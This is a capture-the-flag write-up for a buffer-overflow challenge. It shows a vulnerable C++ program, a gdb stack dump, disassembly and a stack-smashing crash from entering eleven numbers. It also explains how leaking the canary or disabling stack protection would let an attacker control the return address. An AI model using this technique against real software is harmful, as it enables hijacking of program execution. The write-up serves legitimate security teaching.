# Indian Army CTF Stage-2
Submission code for Indian Army CTF Stage 2 `Buffer Overflow Attack`.

zip of relevant files can be found here: [bof_poc.zip](https://github.com/ameetsaahu/indianarmyCTF-S2/files/7596899/bof_poc.zip)
md5 sum of above zip is: `6ebd3531bc9028da78eb24071cf68a23`

We are provided with the following C++ code and we have to crash the application:
```c++
#include <iostream>
using namespace std;
int main(void)
{
  int arr[10];
  int arr_num;
  int num,i;

   cout << "Enter the count of numbers? ";
   cin >> num;

  for (i = 0; i < num; i++)
  {
    cout << "Enter a number to be stored: ";
    cin >> arr_num;
    arr[i]= arr_num;
  }
  return 0;
}
```
I compiled this using `g++` on my Ubuntu 20.04 LTS machine using the following:
```sh
g++ question.cpp -o bof
```
Here the bug occurs because of lack of input validation on variable `num`. User can enter any number they wish and program will ask for that many numbers and keep storing it in the integer array `arr` which is of fixed size i.e. 10. So if we input the value of `num` to be greater than 10, there will be a buffer overflow.
Shown below is the snapshot of stack in `main` function:
```gdb
gef➤  x/20gx $rsp
0x7fffffffddc0:	0x0000004200000002	0x0000000300000041 <-- Variable "num"
0x7fffffffddd0:	0x0000004200000042	0x0000555500000042 <-- Array "arr" starts at address 0x7fffffffddd0
0x7fffffffdde0:	0x0000000000000000	0x00005555555550e0
0x7fffffffddf0:	0x00007fffffffdef0	0xe39ccfaff17fd700 <-- Stack protection canary
0x7fffffffde00:	0x0000000000000000	0x00007ffff7bf30b3 <-- Saved return address
0x7fffffffde10:	0x00007ffff7db7b80	0x00007fffffffdef8
0x7fffffffde20:	0x0000000100011c00	0x00005555555551c9
0x7fffffffde30:	0x00005555555552e0	0xf0c79d903a602fb2
0x7fffffffde40:	0x00005555555550e0	0x00007fffffffdef0
0x7fffffffde50:	0x0000000000000000	0x0000000000000000

gef➤  info frame
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x555555555217 in main; saved rip = 0x7ffff7bf30b3
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08
``` 
Here, as we can see `stack_canary` lies right next to `arr` and hence even if we enter just 11 numbers, it should result in stack_smashing trigger and we will recieve output like this:
```bash
$ ./bof 
Enter the count of numbers? 11
Enter a number to be stored: 1
Enter a number to be stored: 2
Enter a number to be stored: 3
Enter a number to be stored: 4
Enter a number to be stored: 5
Enter a number to be stored: 6
Enter a number to be stored: 7
Enter a number to be stored: 8
Enter a number to be stored: 9
Enter a number to be stored: 10
Enter a number to be stored: 11
*** stack smashing detected ***: terminated
Aborted (core dumped)
```
But if we can somehow leak the value of this `stack_canary`, we can bypass this check and can control the execution flow of the process by overwritting saved return address(as shown in stack dump above). Relevant part of code responsible for the stack protection mechanism starts at main+141 as shown in disassembly below:
```
   0x00005555555551c9 <+0>:	endbr64 
   0x00005555555551cd <+4>:	push   rbp
   0x00005555555551ce <+5>:	mov    rbp,rsp
   0x00005555555551d1 <+8>:	sub    rsp,0x40
   0x00005555555551d5 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x00005555555551de <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x00005555555551e2 <+25>:	xor    eax,eax
   0x00005555555551e4 <+27>:	lea    rsi,[rip+0xe1a]        # 0x555555556005
   0x00005555555551eb <+34>:	lea    rdi,[rip+0x2e4e]        # 0x555555558040 <_ZSt4cout@@GLIBCXX_3.4>
   0x00005555555551f2 <+41>:	call   0x5555555550b0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x00005555555551f7 <+46>:	lea    rax,[rbp-0x38]
   0x00005555555551fb <+50>:	mov    rsi,rax
   0x00005555555551fe <+53>:	lea    rdi,[rip+0x2f5b]        # 0x555555558160 <_ZSt3cin@@GLIBCXX_3.4>
   0x0000555555555205 <+60>:	call   0x555555555090 <_ZNSirsERi@plt>
   0x000055555555520a <+65>:	mov    DWORD PTR [rbp-0x34],0x0
   0x0000555555555211 <+72>:	mov    eax,DWORD PTR [rbp-0x38]
   0x0000555555555214 <+75>:	cmp    DWORD PTR [rbp-0x34],eax
=> 0x0000555555555217 <+78>:	jge    0x555555555251 <main+136>
   0x0000555555555219 <+80>:	lea    rsi,[rip+0xe02]        # 0x555555556022
   0x0000555555555220 <+87>:	lea    rdi,[rip+0x2e19]        # 0x555555558040 <_ZSt4cout@@GLIBCXX_3.4>
   0x0000555555555227 <+94>:	call   0x5555555550b0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x000055555555522c <+99>:	lea    rax,[rbp-0x3c]
   0x0000555555555230 <+103>:	mov    rsi,rax
   0x0000555555555233 <+106>:	lea    rdi,[rip+0x2f26]        # 0x555555558160 <_ZSt3cin@@GLIBCXX_3.4>
   0x000055555555523a <+113>:	call   0x555555555090 <_ZNSirsERi@plt>
   0x000055555555523f <+118>:	mov    edx,DWORD PTR [rbp-0x3c]
   0x0000555555555242 <+121>:	mov    eax,DWORD PTR [rbp-0x34]
   0x0000555555555245 <+124>:	cdqe   
   0x0000555555555247 <+126>:	mov    DWORD PTR [rbp+rax*4-0x30],edx
   0x000055555555524b <+130>:	add    DWORD PTR [rbp-0x34],0x1
   0x000055555555524f <+134>:	jmp    0x555555555211 <main+72>
   0x0000555555555251 <+136>:	mov    eax,0x0
   0x0000555555555256 <+141>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x000055555555525a <+145>:	xor    rcx,QWORD PTR fs:0x28
   0x0000555555555263 <+154>:	je     0x55555555526a <main+161>
   0x0000555555555265 <+156>:	call   0x5555555550c0 <__stack_chk_fail@plt>
   0x000055555555526a <+161>:	leave  
   0x000055555555526b <+162>:	ret  
```
However, if stack smashing protection is not turned on in the binary, then we can reach the saved return address on the stack without any hurdles and hence can get controlled execution(by controlling value of RIP).

https://user-images.githubusercontent.com/45538418/143266461-2e5b3653-d678-4a5a-9938-611e1ef37b0d.mp4




